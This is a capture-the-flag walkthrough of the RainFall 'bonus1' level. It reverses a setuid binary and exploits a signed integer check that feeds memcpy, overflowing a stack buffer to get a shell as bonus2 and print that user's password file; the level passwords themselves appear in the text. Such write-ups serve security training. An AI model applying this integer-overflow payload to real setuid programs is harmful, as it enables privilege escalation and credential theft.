pass: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
# analize the file.
## Search for sticky perms
bonus1@RainFall:~$ ls -lhtr
total 8.0K
-rwsr-s---+ 1 bonus2 users 5.0K Mar  6  2016 bonus1
## Search for strings may useful for reversing/explotation.
bonus1@RainFall:~$ readelf -p .rodata bonus1
String dump of section '.rodata':
  [     8]  sh
  [     b]  /bin/sh *
### * with this string may don't need to create a shellcode.
## Search functions
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048320  memcpy@plt -> memcpy may overflow
0x08048350  execl@plt  -> execute a program -> may /bin/sh
0x08048360  atoi@plt   
0x08048424  main       -> only not library function -> * Custom functions
### look the logic of the custom functions
Dump of assembler code for function main:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp        -> save the stack frame before locals
   0x08048427 <+3>:	and    esp,0xfffffff0 -> align the stack
   0x0804842a <+6>:	sub    esp,0x40 -> local vars
   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc] -> take arg
   0x08048430 <+12>:	add    eax,0x4             -> movo to the second arg + 4 B (ptr size)
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax] -> deref the ptr as dword ptr (32 B like a int)
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax -> param to atoi
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax -> return of atoi save on stack 
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9 -> cmp return of atoi with 9 # the first argument should be 9 or less signed cmp.
   0x08048446 <+34>:	jle    0x804844f <main+43> -> if lower equal continue **
   0x08048448 <+36>:	mov    eax,0x1             -> look like error status
   0x0804844d <+41>:	jmp    0x80484a3 <main+127> ->  return
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c] -> ** save on eax return atoi
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]          -> ecx = adress (4*atoi_return) # weird not signed uses here
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc] -> argv
   0x0804845d <+57>:	add    eax,0x8                 -> &argv[2]
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]     -> argv[2]
   0x08048462 <+62>:	mov    edx,eax                 -> edx = argv[2], ecx = 4 * user_input_atoi_signess
   0x08048464 <+64>:	lea    eax,[esp+0x14]          -> use the pointer of the stack
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx -> param memcpy size_t n
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx -> param memcpy src 
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax     -> param memcpy dst
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46 -> weird condition ad hoc for ctf i guess
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0 -> Null param env execl
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580 -> param arg 'sh'
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583 ->param pathname '/bin/sh'
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret

## let's execute with ltrace for see a little more higher lvl
bonus1@RainFall:~$ ltrace ./bonus1
__libc_start_main(0x8048424, 1, 0xbffffd14, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0, 0x8049764, 1, 0x80482fd, 0xb7fd13e4 <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
bonus1@RainFall:~$ ltrace ./bonus1 "-1"
__libc_start_main(0x8048424, 2, 0xbffffcf4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffe27, 0x8049764, 2, 0x80482fd, 0xb7fd13e4) = -1
memcpy(0xbffffc24, NULL, 4294967292 <unfinished ...> -> the length of memcpy size_t
--- SIGSEGV (Segmentation fault) ---
### As we see we need 2 params

bonus1@RainFall:~$ ltrace ./bonus1 "1" "hola"
__libc_start_main(0x8048424, 3, 0xbffffcf4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffe23, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = 1
memcpy(0xbffffc24, "hola", 4)                         = 0xbffffc24
+++ exited (status 0) +++
### As we see we need to set that value
#### let's do the math
##### Get the prefix
n = (atoi <= 9)
echo "ibase=16;3C -14" | bc
40
prefix of 40 B

##### overflow the 
if (atoi > 0 && atoi <= 9)
   36 < 40 + 4 of address
   Couldn't modify canary
   return ;
##else if (atoi < 0 && atoi <= 9
4294967292 ex -> -1 memcpy(0xbffffc24, NULL, 4294967292 > 44   
Could modify canary
40 + 4 B of ptr should be the size of write at least
we got the result of atoi * 4 or what is the same nbr << 2
we want to write 44 B.
let's make the reverse
44 / 4 = 11.
bonus1@RainFall:~$ echo "44 / 4" | bc
11
let's make the nbr negative but just with the signest bit no more
overflow int = 2147483648 -> this is really -2147483648
bonus1@RainFall:~$ echo "2147483648 + 11" | bc
2147483659
bonus1@RainFall:~$ ltrace ./bonus1 "2147483648"
   __libc_start_main(0x8048424, 2, 0xbffffcf4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffe1f, 0x8049764, 2, 0x80482fd, 0xb7fd13e4) = 0x7fffffff -> unexpected result
+++ exited (status 1) +++
bonus1@RainFall:~$ ltrace ./bonus1 "-2147483648"
__libc_start_main(0x8048424, 2, 0xbffffcf4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffe1e, 0x8049764, 2, 0x80482fd, 0xb7fd13e4) = 0x80000000 -> expected result
memcpy(0xbffffc24, NULL, 0)                           = 0xbffffc24
+++ exited (status 0) +++b
bonus1@RainFall:~$ echo "-2147483648 + 11" | bc
-2147483637
bonus1@RainFall:~$ ltrace ./bonus1 -2147483637
__libc_start_main(0x8048424, 2, 0xbffffcf4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffe1e, 0x8049764, 2, 0x80482fd, 0xb7fd13e4) = 0x8000000b -> b = 11
memcpy(0xbffffc24, NULL, 44 <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
###########
# fine we got the payload for the first argument
##########
-2147483637
###########
# Second payload
###########
prefix=40
0x574f4c46
address=0x574f4c46
 # [::-1]a way of make little endian (reverse the string)
python -c 'print "A"*40 + "\x57\x40\x4c\x46"[::-1]'
bonus1@RainFall:~$ python -c 'print "A"*40 + "\x57\x40\x4c\x46"[::-1]'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFL@W
bonus1@RainFall:~$ python -c 'print "A"*40 + "\x57\x40\x4c\x46"[::-1]'| xxd
0000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000020: 4141 4141 4141 4141 464c 4057 0a         AAAAAAAAFL@W.
bonus1@RainFall:~$ python -c 'print "A"*40 + "\x57\x40\x4c\x46"[::-1]'| wc -c
45 # 44 + '\n'
# let's test it all go good.
bonus1@RainFall:~$  ltrace ./bonus1 -2147483637 $( python -c 'print "A"*40 + "\x57\x40\x4c\x46"[:-1]')
__libc_start_main(0x8048424, 3, 0xbffffcc4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffdf2, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = 0x8000000b
memcpy(0xbffffbf4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 44) = 0xbffffbf4
+++ exited (status 0) +++
#### memcpy not access to the last byte
#### alright i need to pass 45 but because we can't increment just one we need to pass 4 more atoi * 4
11 + 1 = 12
bonus1@RainFall:~$ bonus1@RainFall:~$  echo "-2147483648 + 12" | bc
-2147483636
## let's test that works
bonus1@RainFall:~$ ltrace ./bonus1 -2147483636
__libc_start_main(0x8048424, 2, 0xbffffcf4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffe1e, 0x8049764, 2, 0x80482fd, 0xb7fd13e4) = 0x8000000c
memcpy(0xbffffc24, NULL, 48 <unfinished ...> -> look fine ;)
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
# add a suffix to payload
bonus1@RainFall:~$ python -c 'print "42"*20 + "\x57\x40\x4c\x46"[::-1] + "42"*2'
4242424242424242424242424242424242424242FL@W4242
# payload
1st
-2147483636
2nd
python -c 'print "42"*20 + "\x57\x40\x4c\x46"[::-1] + "42"*2'
## launch | Exploit
bonus1@RainFall:~$ ltrace ./bonus1 -2147483636 $(python -c 'print "42"*20 + "\x57\x40\x4c\x46"[::-1] + "42"*2')
__libc_start_main(0x8048424, 3, 0xbffffcc4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffded, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = 0x8000000c
memcpy(0xbffffbf4, "42424242424242424242424242424242"..., 48) = 0xbffffbf4
+++ exited (status 0) +++
# fail
i got a tipo error
                            0x57404c46
python -c 'print "A"*40 + "\x57\x40\x4c\x46"[::-1]' -> Typo
python -c 'print "A"*40 + "\x57\x4f\x4c\x46"[::-1]' -> Fine

# payload
1st
-2147483637
2nd
$(python -c 'print "A"*40 + "\x57\x4f\x4c\x46"[::-1]')
bonus1@RainFall:~$ ltrace ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x57\x4f\x4c\x46"[::-1]')
__libc_start_main(0x8048424, 3, 0xbffffcc4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffdf1, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = 0x8000000b
memcpy(0xbffffbf4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 44) = 0xbffffbf4
execl(0x8048583, 0x8048580, 0, 0x80482fd, 0xb7fd13e4 <unfinished ...>
# Succesfully exploitation i just need to leave ltrace. ;)
bonus1@RainFall:~$  ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x57\x4f\x4c\x46"[::-1]')
$ id                             # Succesfull
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245